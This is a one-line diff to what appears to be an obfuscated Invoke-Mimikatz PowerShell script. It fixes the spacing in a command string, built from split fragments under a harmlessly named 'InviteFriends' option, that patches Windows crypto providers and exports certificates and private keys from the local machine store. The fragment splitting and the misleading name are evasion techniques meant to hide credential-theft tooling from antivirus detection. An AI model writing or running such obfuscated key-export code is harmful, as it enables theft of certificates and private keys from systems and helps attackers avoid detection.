@@ -2652,7 +2652,7 @@ Function Main
 	}
     elseif ($PsCmdlet.ParameterSetName -ieq "InviteFriends")
     {
-        $ExeArgs = "cry" + "pto::" + "cng " + "cryp" + "to::" + "capi " + "`"cryp" + "to::cer" + "tific" + "ates  " + "/exp" + "ort`"" + "`"cryp" + "to::cer" + "tific" + "ates " + "/exp" + "ort`"" + "/syst" + "emstore:" + "CE" + "RT_" + "SYSTE" + "M_ST" + "ORE_" + "LOC" + "AL" + "_MAC" + "HINE`" " + "exit"
+        $ExeArgs = "cry" + "pto::" + "cng " + "cryp" + "to::" + "capi " + "`"cryp" + "to::cer" + "tific" + "ates  " + "/exp" + "ort`"" + "`"cryp" + "to::cer" + "tific" + "ates " + "/exp" + "ort`" " + "/syst" + "emstore:" + "CE" + "RT_" + "SYSTE" + "M_ST" + "ORE_" + "LOC" + "AL" + "_MAC" + "HINE`" " + "exit"
     }
     else
     {
